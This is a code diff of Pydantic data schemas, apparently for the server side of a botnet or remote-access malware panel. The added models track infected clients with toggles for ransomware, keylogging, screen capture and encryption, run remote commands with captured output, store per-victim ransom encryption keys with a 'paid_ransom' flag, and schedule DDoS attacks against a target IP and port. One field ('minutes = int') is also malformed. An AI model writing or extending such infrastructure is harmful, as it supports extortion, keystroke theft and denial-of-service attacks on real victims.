@@ -7,6 +7,11 @@ class ClientBase(BaseModel):
     client_id: str
     ip_address: str
     operating_system: str
+    ransomware: bool = False
+    keylogger: bool = True
+    screencapture: bool = True
+    cifrado: bool = False
+    polling: int = 10
 
 class ClientCreate(ClientBase):
     pass
@@ -21,6 +26,7 @@ class Client(ClientBase):
 
 class CommandBase(BaseModel):
     command: str
+    capture_output: bool
 
 class CommandCreate(CommandBase):
     client_id: int
@@ -69,3 +75,34 @@ class KeystrokeLog(KeystrokeLogBase):
 
 class KeystrokeLogUpdate(BaseModel):
     text: Optional[str] = None
+
+class RansomwareDataBase(BaseModel):
+    key: str
+    iv: str
+    paid_ransom: bool = False
+
+class RansomwareDataCreate(RansomwareDataBase):
+    client_id: int
+
+class RansomwareData(RansomwareDataBase):
+    id: int
+    client_id: int
+
+    class Config:
+        orm_mode = True
+
+class DDoSAttackBase(BaseModel):
+    ip: str
+    port: int
+    threads: int
+    minutes = int
+    scheduled_time: datetime
+
+class DDoSAttackCreate(DDoSAttackBase):
+    pass
+
+class DDoSAttack(DDoSAttackBase):
+    id: int
+
+    class Config:
+        orm_mode = True
